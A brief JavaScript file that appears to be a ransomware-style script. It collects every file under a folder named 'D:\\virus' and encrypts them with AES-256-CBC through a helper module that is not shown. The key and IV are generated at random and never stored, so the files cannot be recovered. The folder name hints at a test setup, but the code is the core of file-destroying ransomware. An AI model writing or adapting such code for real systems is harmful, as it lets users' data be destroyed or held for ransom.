import { getFiles, incryptFiles } from "./helpers.js";
import crypto from "crypto";

let files = []
const key = 5

const encryptionKey = crypto.randomBytes(32);
const initVector = crypto.randomBytes(16);
const algorithm = "aes-256-cbc";

try {
  files = await getFiles("D:\\virus")
  await incryptFiles(files, encryptionKey, initVector, algorithm)
} catch (error) {
  console.log('error', error);
}